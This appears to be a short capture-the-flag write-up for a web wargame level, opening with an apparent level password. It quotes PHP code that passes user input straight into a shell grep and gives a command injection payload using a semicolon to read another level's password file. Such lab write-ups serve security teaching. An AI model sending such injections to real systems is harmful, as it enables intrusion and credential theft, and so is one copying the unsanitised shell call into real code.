nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

This one is pretty cool. There is a search function that outputs all dictionary words that contain your search key. Pretty neat app, right? Looking at the source, it looks like:

```javascript
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

So, this code actually passes the user input `$key` to the machine to do a `grep` on a dictionary. The problem with this is that the user can input arbitrary logic:

```bash
; cat /etc/natas_webpass/natas10 #
```

The semicolon ends the `grep` command. Then we just `cat` the password for the next level and end with a `#` to comment out any following code.
